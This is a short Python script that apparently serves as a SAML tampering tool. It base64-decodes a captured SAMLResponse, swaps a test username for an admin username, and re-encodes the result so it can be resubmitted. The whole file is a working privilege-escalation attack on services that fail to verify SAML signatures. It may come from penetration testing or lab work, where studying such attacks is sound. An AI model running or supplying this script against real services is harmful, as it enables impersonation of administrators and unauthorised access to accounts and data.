import urllib.parse
import base64
from urllib.parse import unquote
from urllib.parse import quote


tUser = input('Test Username: ').encode('UTF-8')
aUser = input('Admin Username: ').encode('UTF-8')

saml_dec = base64.b64decode(unquote(input('SAMLRespone: ')))
saml_edit = saml_dec.replace(tUser,aUser)
final = urllib.parse.quote(base64.b64encode(saml_edit).decode())

print ('\n\n\n\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n\n\n')
print (final)

